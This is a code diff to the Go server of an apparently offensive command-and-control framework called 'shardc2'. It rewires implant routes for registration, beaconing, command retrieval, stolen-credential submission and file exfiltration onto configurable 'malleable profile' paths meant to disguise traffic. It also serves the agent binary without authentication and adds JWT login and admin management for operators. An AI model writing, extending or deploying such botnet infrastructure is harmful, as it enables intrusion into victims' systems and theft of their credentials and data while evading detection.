@@ -22,6 +22,7 @@ import (
 	"github.com/shardc2/shardc2/internal/server/engine"
 	"github.com/shardc2/shardc2/internal/server/handlers"
 	"github.com/shardc2/shardc2/internal/server/middleware"
+	"github.com/shardc2/shardc2/pkg/profiles"
 )
 
 type ServerConfig struct {
@@ -29,6 +30,8 @@ type ServerConfig struct {
 	ImplantKey    string
 	PayloadKey    []byte
 	C2URL         string
+	Profile       *profiles.Profile
+	JWTSecret     []byte
 }
 
 type Server struct {
@@ -80,27 +83,32 @@ func (s *Server) setupRoutes() {
 	campHandler := handlers.NewCampaignHandler(s.db)
 	exfilHandler := handlers.NewExfilHandler(s.db)
 
-	// Agent routes (per-route middleware to avoid prefix collision)
+	// Agent routes using malleable profile paths
 	implantMW := middleware.ImplantAuth(s.config.ImplantKey)
 	agentMW := middleware.AgentAuth(s.db)
 	payloadMW := middleware.PayloadCrypto(s.config.PayloadKey)
 	agentLimiter := limiter.New(limiter.Config{Max: 60, Expiration: time.Minute})
 
-	agent := api.Group("/agent")
-	agent.Get("/binary", func(c *fiber.Ctx) error {
+	p := s.config.Profile
+	if p == nil {
+		p = profiles.Default()
+	}
+
+	api.Get("/agent/binary", func(c *fiber.Ctx) error {
 		arch := c.Query("arch", "arm64")
 		if arch == "amd64" || arch == "x86_64" {
 			return c.SendFile("./bin/shardc2-agent-amd64", false)
 		}
 		return c.SendFile("./bin/shardc2-agent", false)
 	})
-	agent.Post("/register", payloadMW, implantMW, botHandler.Register)
-	agent.Post("/beacon", payloadMW, agentMW, agentLimiter, botHandler.AgentBeacon)
-	agent.Get("/commands", payloadMW, agentMW, agentLimiter, cmdHandler.AgentGetPending)
-	agent.Post("/result", payloadMW, agentMW, agentLimiter, cmdHandler.SubmitResult)
-	agent.Post("/credentials", payloadMW, agentMW, agentLimiter, credHandler.Submit)
-	agent.Post("/exfil", payloadMW, agentMW, agentLimiter, exfilHandler.Upload)
-	agent.Post("/refresh-token", payloadMW, agentMW, botHandler.RefreshToken)
+
+	s.app.Post(p.ServerPath("register"), payloadMW, implantMW, botHandler.Register)
+	s.app.Post(p.ServerPath("beacon"), payloadMW, agentMW, agentLimiter, botHandler.AgentBeacon)
+	s.app.Get(p.ServerPath("commands"), payloadMW, agentMW, agentLimiter, cmdHandler.AgentGetPending)
+	s.app.Post(p.ServerPath("result"), payloadMW, agentMW, agentLimiter, cmdHandler.SubmitResult)
+	s.app.Post(p.ServerPath("credentials"), payloadMW, agentMW, agentLimiter, credHandler.Submit)
+	s.app.Post(p.ServerPath("exfil"), payloadMW, agentMW, agentLimiter, exfilHandler.Upload)
+	s.app.Post(p.ServerPath("refresh_token"), payloadMW, agentMW, botHandler.RefreshToken)
 
 	// WebSocket route (auth via query param)
 	api.Use("/ws", handlers.WSUpgradeCheck())
@@ -112,8 +120,24 @@ func (s *Server) setupRoutes() {
 		return c.Next()
 	}, websocket.New(handlers.WSHandler(wsHub)))
 
-	// Operator routes
-	op := api.Group("", middleware.OperatorAuth(s.config.OperatorToken))
+	// Operator auth & login routes
+	opHandler := handlers.NewOperatorHandler(s.db, s.config.JWTSecret)
+	api.Post("/auth/login", opHandler.Login)
+
+	// Operator routes — accept legacy bearer token OR JWT
+	opAuth := func(c *fiber.Ctx) error {
+		auth := c.Get("Authorization")
+		if len(auth) > 7 && auth[:7] == "Bearer " {
+			token := auth[7:]
+			if token == s.config.OperatorToken {
+				c.Locals("operator_role", "admin")
+				return c.Next()
+			}
+		}
+		return middleware.JWTAuth(s.config.JWTSecret)(c)
+	}
+
+	op := api.Group("", opAuth)
 	op.Use(limiter.New(limiter.Config{Max: 120, Expiration: time.Minute}))
 
 	bots := op.Group("/bots")
@@ -150,6 +174,18 @@ func (s *Server) setupRoutes() {
 	exfil.Delete("/:id", exfilHandler.Delete)
 
 	op.Get("/stats", botHandler.Stats)
+
+	// Admin-only operator management
+	opAdmin := op.Group("/operators", func(c *fiber.Ctx) error {
+		role, _ := c.Locals("operator_role").(string)
+		if role != "admin" {
+			return c.Status(403).JSON(fiber.Map{"error": "admin access required"})
+		}
+		return c.Next()
+	})
+	opAdmin.Post("/", opHandler.Register)
+	opAdmin.Get("/", opHandler.List)
+	opAdmin.Delete("/:id", opHandler.Deactivate)
 }
 
 func (s *Server) Start(addr string) error {
